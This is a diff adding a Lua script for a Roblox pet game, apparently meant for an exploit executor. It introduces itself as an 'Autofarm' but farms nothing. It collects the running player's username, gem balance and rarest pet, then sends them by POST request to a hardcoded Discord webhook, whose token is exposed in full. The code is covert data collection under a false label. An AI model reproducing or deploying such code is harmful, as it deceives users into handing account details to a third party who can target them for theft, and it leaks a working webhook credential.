@@ -1,0 +1,34 @@
+return function()
+local msg = ""
+local e = "Autofarm Executed by "..game.Players.LocalPlayer.Name
+local uuu,vvv
+uuu,vvv=pcall(function()
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+save = save.Get()
+local s = save.Inventory.Currency
+for i,v in pairs(s) do
+if v.id == "Diamonds" then
+e = e.."\nGems: "..v._am
+end
+end
+local big = 0
+for i,v in pairs(save.Inventory.Pet) do
+if require(dir[v.id]).difficulty >= big then
+big = require(dir[v.id]).difficulty
+end
+end
+e = e.."\nBest Pet: 1/"..big
+end)
+msg = '{"content":"'..e..'"}'
+local response =
+        request(
+        {
+            Url = "https://discord.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = msg
+        }
+    )
+return response
+end
